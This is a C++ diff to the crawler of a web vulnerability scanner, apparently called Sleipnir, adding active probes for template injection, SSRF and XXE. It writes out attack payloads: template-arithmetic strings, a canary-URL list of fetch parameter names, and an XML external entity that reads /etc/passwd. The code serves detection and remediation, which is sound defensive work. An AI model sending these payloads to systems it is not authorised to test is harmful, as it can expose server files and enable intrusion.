@@ -1,4 +1,5 @@
 #include "sleipnir/crawler.hpp"
+#include "sleipnir/verify.hpp"
 
 #include <algorithm>
 #include <cctype>
@@ -448,6 +449,15 @@ std::vector<Finding> check_crawled_app(const HttpFetcher& fetch,
                                        const CrawlResult& crawl,
                                        const std::string& host, uint16_t port,
                                        const ActiveProbeConfig& cfg) {
+    // No POST fetcher -> POST-based probes (XXE) are unavailable.
+    return check_crawled_app(fetch, HttpPostFetcher{}, crawl, host, port, cfg);
+}
+
+std::vector<Finding> check_crawled_app(const HttpFetcher& fetch,
+                                       const HttpPostFetcher& post_fetch,
+                                       const CrawlResult& crawl,
+                                       const std::string& host, uint16_t port,
+                                       const ActiveProbeConfig& cfg) {
     std::vector<Finding> out;
     auto add = [&](const std::string& title, Severity sev,
                    const std::string& description, const std::string& evidence) {
@@ -459,6 +469,10 @@ std::vector<Finding> check_crawled_app(const HttpFetcher& fetch,
         f.description = description;
         f.evidence = evidence;
         f.source = "webapp";
+        // These probes report only behavioral evidence (a marker only a
+        // vulnerable target returns), so they are confirmed by construction.
+        f.verified = true;
+        f.confidence = "confirmed";
         out.push_back(std::move(f));
     };
     int budget = cfg.max_requests;
@@ -600,6 +614,164 @@ std::vector<Finding> check_crawled_app(const HttpFetcher& fetch,
                     "GET " + join_url(up) + " -> " +
                         std::to_string(resp->status));
             }
+        }
+    }
+
+    // Server-side template injection: template arithmetic whose result only
+    // an evaluating engine produces. Markers embed the arithmetic result
+    // between sentinel words / distinctive operands, so a raw reflection of
+    // the payload never matches.
+    if (cfg.probe_ssti) {
+        struct SstiPayload {
+            const char* payload;
+            const char* marker;
+            const char* engine;
+        };
+        static const SstiPayload ssti_payloads[] = {
+            {"{{7*'7'}}", "7777777", "Jinja2/Twig"},
+            {"SLEIPNSTI${7*7}SLEIPNSTI", "SLEIPNSTI49SLEIPNSTI",
+             "Freemarker/Spring/Mako"},
+        };
+        for (const auto& url : crawl.param_urls) {
+            if (budget <= 0) break;
+            UrlParts up = split_url(url);
+            for (auto& [name, value] : up.params) {
+                bool hit = false;
+                for (const auto& sp : ssti_payloads) {
+                    if (budget-- <= 0) break;
+                    std::string orig = value;
+                    value = sp.payload;
+                    auto resp = fetch(join_url(up));
+                    value = orig;
+                    if (!resp ||
+                        resp->body.find(sp.marker) == std::string::npos)
+                        continue;
+                    size_t pos = resp->body.find(sp.marker);
+                    add("Server-side template injection in parameter",
+                        Severity::Critical,
+                        std::string("The parameter '") + name +
+                            "' is interpolated into a server-side template: "
+                            "arithmetic in the payload was evaluated (" +
+                            sp.engine +
+                            "-style syntax). Template injection typically "
+                            "escalates to remote code execution. Never pass "
+                            "user input into template engines.",
+                        "GET " + join_url(up) + " -> evaluated marker '" +
+                            sp.marker + "' at offset " + std::to_string(pos) +
+                            ": ..." +
+                            snippet(resp->body.substr(
+                                std::max(0, static_cast<int>(pos) - 40), 120)) +
+                            "...");
+                    hit = true;
+                    break;
+                }
+                if (hit) break;
+            }
+        }
+    }
+
+    // SSRF canary: fetch-like parameters get an unresolvable canary URL. A
+    // server-side fetch attempt shows up as an error message naming the
+    // canary host. Without an out-of-band callback this stays "potential":
+    // confirmation requires seeing the request arrive on a server we control.
+    if (cfg.probe_ssrf) {
+        static const char* ssrf_params[] = {
+            "url",    "uri",    "src",       "source",   "link",   "fetch",
+            "fetchurl", "target", "site",    "server",   "callback", "cb",
+            "feed",   "proxy",  "webhook",   "imageurl", "docurl", "load"};
+        const std::string canary =
+            "sln-ssrf-" + canary_token() + ".invalid";
+        const std::string payload = "http://" + canary + "/";
+        static const char* fetch_errors[] = {
+            "could not", "unable to", "unresolved", "resolve",
+            "connection refused", "timed out", "timeout", "unreachable",
+            "unknown host", "getaddrinfo", "name or service not known"};
+        for (const auto& url : crawl.param_urls) {
+            if (budget <= 0) break;
+            UrlParts up = split_url(url);
+            for (auto& [name, value] : up.params) {
+                bool match = false;
+                for (const char* p : ssrf_params)
+                    if (to_lower(name) == p) { match = true; break; }
+                if (!match) continue;
+                if (budget-- <= 0) break;
+                std::string orig = value;
+                value = payload;
+                auto resp = fetch(join_url(up));
+                value = orig;
+                if (!resp) continue;
+                if (resp->body.find(canary) == std::string::npos) continue;
+                std::string low = to_lower(resp->body);
+                bool fetch_attempt = false;
+                for (const char* e : fetch_errors)
+                    if (low.find(e) != std::string::npos) {
+                        fetch_attempt = true;
+                        break;
+                    }
+                if (!fetch_attempt) continue; // plain echo of the input
+                Finding f;
+                f.host = host;
+                f.port = port;
+                f.title = "Possible server-side request forgery (SSRF)";
+                f.severity = Severity::High;
+                f.description =
+                    std::string("The parameter '") + name +
+                    "' appears to be fetched server-side: a canary URL "
+                    "pointing at an unresolvable host produced a fetch error "
+                    "naming that host. Confirm with an out-of-band callback "
+                    "server, then validate/allow-list fetch targets and block "
+                    "internal address ranges.";
+                size_t pos = resp->body.find(canary);
+                f.evidence = "GET " + join_url(up) + " -> fetch error mentioning "
+                             "the canary host: ..." +
+                             snippet(resp->body.substr(
+                                 std::max(0, static_cast<int>(pos) - 60), 160)) +
+                             "...";
+                f.source = "webapp";
+                f.verified = false;
+                f.confidence = "potential";
+                out.push_back(std::move(f));
+                break;
+            }
+        }
+    }
+
+    // XXE: POST an XML document with an external entity reading /etc/passwd
+    // to discovered endpoints. Confirmed only when the parsed entity content
+    // comes back in the response (in-band XXE).
+    if (cfg.probe_xxe && cfg.allow_post && post_fetch) {
+        const std::string xxe_body =
+            "<?xml version=\"1.0\"?>\n"
+            "<!DOCTYPE sln [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n"
+            "<sln>&xxe;</sln>";
+        std::set<std::string> reported;
+        for (const auto& form : crawl.forms) {
+            if (budget <= 0) break;
+            if (!reported.insert(form.action_path).second) continue;
+            if (budget-- <= 0) break;
+            auto resp = post_fetch(form.action_path, xxe_body, "application/xml");
+            if (!resp) continue;
+            if (resp->body.find("root:x:0:0:") == std::string::npos &&
+                resp->body.find("root:*:0:0:") == std::string::npos)
+                continue;
+            size_t pos = resp->body.find("root:x:0:0:") != std::string::npos
+                             ? resp->body.find("root:x:0:0:")
+                             : resp->body.find("root:*:0:0:");
+            add("XML external entity (XXE): local file disclosure",
+                Severity::Critical,
+                std::string("POSTing an XML document with an external entity "
+                            "to ") +
+                    form.action_path +
+                    " returned /etc/passwd content: the parser resolves "
+                    "external entities and echoes them. Disable external "
+                    "entity resolution (and DTDs) in the XML processing.",
+                "POST " + form.action_path +
+                    " (application/xml) with <!ENTITY xxe SYSTEM "
+                    "\"file:///etc/passwd\"> -> passwd content at offset " +
+                    std::to_string(pos) + ": ..." +
+                    snippet(resp->body.substr(
+                        std::max(0, static_cast<int>(pos) - 30), 120)) +
+                    "...");
         }
     }
 
